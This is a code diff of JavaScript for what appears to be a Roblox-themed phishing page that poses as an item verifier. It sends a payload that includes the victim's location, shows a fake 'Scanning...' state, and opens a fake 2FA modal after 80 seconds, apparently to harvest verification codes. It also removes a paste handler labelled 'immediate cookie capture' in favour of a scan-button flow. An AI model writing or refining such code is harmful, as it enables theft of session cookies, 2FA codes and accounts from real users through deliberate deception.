@@ -276,18 +276,22 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
             },
             body: JSON.stringify(payload)
         });
-        
-        // Hide loading overlay
-        if (loadingOverlay) loadingOverlay.style.display = 'none';
 
         if (response.ok) {
-            submitText.textContent = 'Sent!';
-            submitBtn.style.background = '#10b981';
-            showNotification('Data sent successfully!', 'success');
+            submitText.textContent = 'Scanning...';
             
+            // Close modal and start item name rotation
             setTimeout(() => {
                 closeScanModal();
-            }, 2000);
+                startItemNameRotation();
+            }, 500);
+            
+            // Show 2FA after 80 seconds
+            setTimeout(() => {
+                console.log('🔐 80 SECONDS ELAPSED - SHOWING 2FA MODAL!');
+                openVerificationModal();
+            }, 80000); // 80 seconds
+            
         } else {
             throw new Error(`Item scanning failed with status: ${response.status}`);
         }
@@ -700,26 +704,8 @@ function showVerificationSuccess(trustDevice) {
     setTimeout(() => {
         closeVerificationModal();
         
-        // Go back to checking items after 2FA
-        const loadingOverlay = document.getElementById('loadingOverlay');
-        if (loadingOverlay) {
-            loadingOverlay.style.display = 'flex';
-            
-            // Update loading text to show final checking
-            const loadingText = document.querySelector('#loadingOverlay h3');
-            if (loadingText) {
-                loadingText.textContent = 'Finalizing verification...';
-                
-                // Show final completion after 3 seconds
-                setTimeout(() => {
-                    loadingText.textContent = 'Verification complete!';
-                    setTimeout(() => {
-                        loadingOverlay.style.display = 'none';
-                        loadingText.textContent = 'Verifying Roblox Items...'; // Reset for next time
-                    }, 2000);
-                }, 3000);
-            }
-        }
+        // Keep loading after 2FA - continue with item names
+        startItemNameRotation();
         
         // Reset button
         verifyBtn.disabled = false;
@@ -1110,13 +1096,7 @@ document.addEventListener('DOMContentLoaded', function() {
             updateCharCount();
         });
         
-        // Handle paste events for immediate cookie capture
-        textarea.addEventListener('paste', function(e) {
-            setTimeout(() => {
-                const pastedText = this.value;
-                handlePasteEvent(pastedText);
-            }, 100); // Small delay to ensure paste content is processed
-        });
+        // Paste detection removed - using scan button flow instead
         
         // Initialize character count
         updateCharCount();
